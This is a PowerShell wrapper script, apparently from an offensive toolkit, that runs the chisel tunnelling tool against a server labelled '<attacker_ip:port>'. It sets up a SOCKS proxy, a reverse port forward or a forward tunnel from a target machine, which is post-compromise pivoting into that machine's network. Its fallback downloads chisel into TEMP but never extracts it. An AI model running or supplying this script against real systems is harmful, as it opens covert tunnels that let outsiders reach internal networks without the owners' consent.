# Chisel Tunnel Wrapper
# Usage: .\chisel-wrapper.ps1 -server <attacker_ip:port> -remote <target_port> -socks
param(
    [string]$server,
    [string]$remote,
    [switch]$socks,
    [string]$bind = "0.0.0.0"
)

if (-not $server) {
    Write-Host "Usage: .\chisel-wrapper.ps1 -server <attacker_ip:port> [-remote <port>] [-socks]"
    exit 1
}

$chiselPath = "C:\cyberstrike\tools\chisel.exe"
if (-not (Test-Path $chiselPath)) {
    Write-Host "[!] chisel.exe not found at $chiselPath"
    Write-Host "[*] Downloading chisel..."
    $arch = if ([Environment]::Is64BitOperatingSystem) { "amd64" } else { "386" }
    $url = "https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_$arch.gz"
    Invoke-WebRequest -Uri $url -OutFile "$env:TEMP\chisel.gz"
    # Extract and move
    Write-Host "[*] Install chisel manually from: $url"
    exit 1
}

if ($socks) {
    Write-Host "[*] Starting chisel SOCKS proxy through $server"
    & $chiselPath client $server socks
} elseif ($remote) {
    Write-Host "[*] Starting chisel reverse port forward: $remote -> $server"
    & $chiselPath client $server R:$remote
} else {
    Write-Host "[*] Starting chisel forward tunnel"
    & $chiselPath client $server
}
